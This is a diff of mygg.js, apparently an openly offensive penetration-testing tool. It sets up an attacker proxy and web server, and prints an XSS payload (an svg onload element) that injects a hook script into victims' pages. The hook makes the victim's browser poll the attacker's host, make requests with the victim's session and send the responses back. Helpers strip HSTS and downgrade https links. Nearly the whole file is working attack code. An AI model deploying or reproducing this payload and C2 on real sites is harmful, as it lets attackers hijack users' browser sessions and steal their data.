@@ -1,43 +1,51 @@
-/* Config */
+/* --------- Info --------- */
+
+//  mygg.js v0.3 
+//  Author: Daniel Solstad
+//  Repository: https://github.com/dsolstad/mygg.js
+
+
+/* --------- Configuration --------- */
+
+// The only thing you really need to change is the domain parameter.
+// If you don't have a domain, change domain to the ipaddr of the server hosting mygg.js.
+// If mygg is running on a remote server, either leave proxy_interface at 127.0.0.1 and use ssh+portforwarding,
+// or bind it to 0.0.0.0 and put your remote addr in proxy_allowed_ips. 
+
 const config = {
-    // Change web_domain to your domain. 
-    // If you don't have a domain, then change web_domain to the ipaddr of the server hosting mygg.js.
-    web_domain: 'example.com',           
-    web_interface: '0.0.0.0',
-    web_port: 80,
-    web_protocol: 'http',
+    domain: 'example.com',
+    http_interface: '0.0.0.0',
+    https_interface: '0.0.0.0',
+    http_port: 80,
+    https_port: 443,
     polling_time: 2000,
-    key: './server-key.pem',
-    cert: './server-cert.pem',
-    // Provides additional debug output
+    key: './key.pem',
+    cert: './cert.pem',
     debug: 0,
-    // If mygg is running on a remote server, then either set proxy_interface to 127.0.0.1 and use ssh+portforwarding
-    // or bind it to 0.0.0.0 and put your remote addr in proxy_allowed_ips.
     proxy_interface: '127.0.0.1',
     proxy_port: 8081,
     proxy_allowed_ips: ['127.0.0.1'],
 }
 
-const web = require(config.web_protocol);
+/* --------- Requires --------- */
+
+const http = require('http');
+const https = require('https');
 const proxy = require('http');
 const fs = require('fs');
-const qs = require('querystring');
 const Busboy = require('busboy');
+const { spawn } = require('child_process');
 
-/* 
-task_pending structure:
-[{"id":2,"method":"POST","url":"/secret.html","head":{"Content-Type":"application/json"},"body":'{"test":"asdf"}'}]
-*/
+/* --------- Global variables --------- */
 
 var tasks_pending = [];
 var task_callbacks = {};
-
-/* The HTTP proxy server that communicates with mygg */
-
 var task_counter = 0;
 
+/* --------- The HTTP proxy server that the attacker uses --------- */
+
 proxy.createServer(function (req, res) {
-    /* Checks if the client is allowed */
+    /* Checks if the client is allowed. */
     var client_ipaddr = req.connection.remoteAddress;
     if (config.proxy_allowed_ips.indexOf(client_ipaddr) === -1) {
         console.log(`[+] Denied client ${client_ipaddr} to connect to proxy`);
@@ -47,28 +55,29 @@ proxy.createServer(function (req, res) {
     }
 
     console.log(`[+] Whitelisted client ${client_ipaddr} connected to proxy`);
-    console.log("[+] Requesting: " + req.method + " " + req.url)
+    console.log("[+] Requesting: " + req.method + " " + req.url);
     
-    var urlObj = new URL(req.url)
+    /* Get the full requested URL. */
+    var urlObj = new URL(req.url);
     var url = urlObj.pathname;
     if (urlObj.searchParams != '') {
         url = url + '?' + urlObj.searchParams;
     }
     
-    /* Check if request from proxy/attacker contains a body */
+    /* Check if request from proxy/attacker contains a body. */
     if (req.headers['content-length'] > 0) {
         var data = [];
         req.on('data', function (chunk) {
             data.push(chunk);
         });
         req.on('end', function () {
-            // Sends a task to the hooked browser
+            /* Sends a task to the hooked browser. */
             var buffer = Buffer.concat(data);
             var body = buffer.toString('utf8');
             var new_task = {"id": task_counter++, "method": req.method, "url": url, "head": req.headers, "body": body}
             tasks_pending.push(new_task);
             
-            // Handles the response from the task given to the hooked browser
+            /* Handles the response from the task given to the hooked browser. */
             task_callbacks[new_task.id] = function (result) {
                 var headers = result.headers;
                 var headers = str2json(headers);
@@ -89,16 +98,16 @@ proxy.createServer(function (req, res) {
                 var body_length = body.length;
                 var headers = updateContentLength(headers, body_length);
 
-	        console.log("[+] Received status " + result.status + " [" + body_length + " bytes]");
-                if (config.debug) { console.log("[+] Received headers:\n"); console.log(headers); }
-                if (config.debug) { console.log("[+] Received body:\n" + body); }
-                console.log("[+] -------------------------------- [+]");
+	            console.log("[+] Received status: " + result.status);
+	            if (config.debug) { console.log("[+] Received headers:\n"); console.log(headers); }
+	            if (config.debug) { console.log("[+] Received body:\n" + body); }
+	            console.log("[+] -------------------------------- [+]");
 
                 res.writeHead(result.status, headers);
                 res.end(body);
             };
         });
-	} else {
+    } else {
         /* Sends a task to the hooked browser. */
         var new_task = {"id": task_counter++, "method": req.method, "url": url, "head": req.headers, "body": null}
         tasks_pending.push(new_task);
@@ -124,10 +133,10 @@ proxy.createServer(function (req, res) {
             var body_length = body.length;
             var headers = updateContentLength(headers, body_length);
 
-            console.log("[+] Received status " + result.status + " [" + body_length + " bytes]");
-            if (config.debug) { console.log("[+] Received headers:\n"); console.log(headers); }
-            if (config.debug) { console.log("[+] Received body:\n" + body); }
-            console.log("[+] -------------------------------- [+]");
+	        console.log("[+] Received status: " + result.status);
+	        if (config.debug) { console.log("[+] Received headers:\n"); console.log(headers); }
+	        if (config.debug) { console.log("[+] Received body:\n" + body); }
+	        console.log("[+] -------------------------------- [+]");
 
             res.writeHead(result.status, headers);
             res.end(body);
@@ -137,21 +146,13 @@ proxy.createServer(function (req, res) {
 }).listen(config.proxy_port, config.proxy_interface, function (err) {
     if (err) return console.error(err)
     var info = this.address()
-    console.log(`[+] Proxy server is listening on address ${info.address} port ${info.port}`)
+    console.log(`[+] Proxy server listening on address ${info.address} port ${info.port}`)
 });
 
 
-/* 
-The web server communicating with the hooked browser.
-Used for serving hook.js, polling and receving requests.
-*/
+/* --------- HTTP and HTTPS server for serving hook.js, polling and receiving requests --------- */
 
-const https_options = {
-    key: fs.readFileSync(config.key),
-    cert: fs.readFileSync(config.cert)
-};
-
-web.createServer(https_options, function (req, res) {
+http_handler = function(req, res) {
     var ipaddr = req.connection.remoteAddress;
     var useragent = req.headers['user-agent'];
     var referer = req.headers['referer'];
@@ -169,7 +170,8 @@ web.createServer(https_options, function (req, res) {
         if (tasks_pending.length > 0) {
             data = JSON.stringify(tasks_pending);
             if (config.debug) { 
-                console.log("[+] Tasks pending"); console.log(data); 
+                console.log("[+] Tasks pending"); 
+                console.log(data); 
                 console.log("[+] -------------------------------- [+]");
             }
             res.writeHead(200);
@@ -197,7 +199,6 @@ web.createServer(https_options, function (req, res) {
                 response[fieldname] = Buffer.concat(response[fieldname]);
             });
         });
-
         busboy.on('field', function(fieldname, val, fieldnameTruncated, valTruncated, encoding, mimetype) {
             //console.log('Field [' + fieldname + ']: value: ' + inspect(val));
             response[fieldname] = val;
@@ -206,7 +207,6 @@ web.createServer(https_options, function (req, res) {
             // Runs the callback for the associated request ID
             var handler = task_callbacks[response['id']];
             handler(response);
-
             res.writeHead(200, { Connection: 'close' });
             res.end();
         });
@@ -217,14 +217,32 @@ web.createServer(https_options, function (req, res) {
         res.writeHead(404);
         res.end();
     }
-}).listen(config.web_port, config.web_interface, function (err) {
+};
+
+/* Start HTTP Server */
+http.createServer(http_handler).listen(config.http_port, config.http_interface, function(err) {
     if (err) return console.error(err)
     var info = this.address()
-    console.log(`[+] Web server is listening on address ${info.address} port ${info.port}`)
+    console.log(`[+] HTTP server listening on address ${info.address} port ${info.port}`)
+});
+
+/* Generate key and self-signed certificate. */
+const openssl = spawn('openssl', 'req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj /CN=localhost'.split(" "));
+
+/* Read key and cert before starting HTTPS Server. */
+openssl.on('close', function (code) {
+    https_options = { key: fs.readFileSync(config.key), cert: fs.readFileSync(config.cert) };
+    https.createServer(https_options, http_handler).listen(config.https_port, config.https_interface, function(err) {
+        if (err) return console.error(err)
+        var info = this.address()
+        console.log(`[+] HTTPS server listening on address ${info.address} port ${info.port}`)
+    });
 });
 
 
-/* Removes unwanted headers, such as HSTS */
+/* --------- Helper functions --------- */
+
+/* Removes unwanted headers, such as HSTS. */
 function stripHeaders(headers) {
     delete headers['strict-transport-security'];
     delete headers['content-encoding'];
@@ -232,22 +250,23 @@ function stripHeaders(headers) {
     return headers;
 }
 
-/* Strips complete URLs with hook.js to "javascript", which will be ignored */
+/* Strips complete URLs with hook.js to "javascript", which will be ignored. */
 function stripHooks(body) {
     return body.replace(/https?:\/\/.*?\/hook\.js/g, 'javascript:#');
 }
 
-/* Convert links in the body from https to http */
+/* Convert links in the body from https to http. */
 function https2http(body) {
     return body.toString().replace(/https\:\/\//g, "http://");
 }
 
-/* Sets the content-length header */
+/* Sets the content-length header. */
 function updateContentLength(headers, new_length) {
     headers['Content-Length'] = new_length;
     return headers;
 }
 
+/* Converts a string to JSON. */
 function str2json(headers) {
     var arr = headers.trim().split(/[\r\n]+/);
     var header_map = {};
@@ -260,39 +279,43 @@ function str2json(headers) {
     return header_map;
 }
 
-/* The payload that downloads mygg */
+
+/* --------- Payload stager that downloads mygg --------- */
+
 var hook = `<svg/onload="var x=document.createElement('script');\
-x.src='//${config.web_domain}:${config.web_port}/hook.js';document.head.appendChild(x);">`
+x.src='//${config.domain}:${config.https_port}/hook.js';document.head.appendChild(x);">`
 console.log("[+] Payload:\r\n" + hook + "\r\n");
+
+
+/* --------- The mygg.js payload --------- */
 
 var hook_file = `
 function makeRequest(id, method, url, head, body) {
-    // Forcing the hooked browser to perform the request
+    /* Forcing the "victim" browser to perform the request. */
     var target_http = new XMLHttpRequest();
     target_http.responseType = 'blob';
     target_http.onreadystatechange = function() {
 
-        // Sending the response back to mygg
+        /* Sending the response back to mygg. */
         if (target_http.readyState == 4) {
             var formData = new FormData();
             formData.append('id', id);
             formData.append('method', method);
             formData.append('url', url);
 
-            // Checking if the browser got a redirect
+            /* Checking if the browser got a redirect. */
             if (url == getPath(target_http.responseURL)) {
                 formData.append('status', target_http.status);
                 formData.append('headers', target_http.getAllResponseHeaders());
                 var blob = new Blob([target_http.response], {type: 'application/octet-stream'});
                 formData.append('body', blob);
             } else {
-                // Need to redirect the attacking browser too
+                /* Need to redirect the attacking browser too. */
                 formData.append('status', '301');
                 formData.append('head', "Location: " + target_http.responseURL);
             }
-
             var mygg_http = new XMLHttpRequest();
-            mygg_http.open("POST", "//${config.web_domain}:${config.web_port}/responses", true);
+            mygg_http.open("POST", "//${config.domain}:" + getPort() + "/responses", true);
             mygg_http.send(formData);
         }
     };
@@ -308,20 +331,24 @@ function makeRequest(id, method, url, head, body) {
 function getPath(url) {
     return '/' + url.split('/').splice(3).join('/');
 }
+function getPort() {
+    var ports = {'http': ${config.http_port}, 'https': ${config.https_port}};
+    return ports[location.protocol.slice(0, -1)];
+}
 function poll() {
     var mygg_http = new XMLHttpRequest();
     mygg_http.onreadystatechange = function () {
         if (mygg_http.readyState == 4 && mygg_http.status == 200) {
             var tasks = JSON.parse(mygg_http.responseText);
             for (var i in tasks){
+                console.log("New task");console.log(tasks[i]);
                 makeRequest(tasks[i].id, tasks[i].method, tasks[i].url, tasks[i].head, tasks[i].body);
             }
         }
     };
-    mygg_http.open("GET", "//${config.web_domain}:${config.web_port}/polling", true);
+    mygg_http.open("GET", "//${config.domain}:" + getPort() + "/polling", true);
     mygg_http.send();
     setTimeout(poll, ${config.polling_time});
 }
 poll();
 `;
-
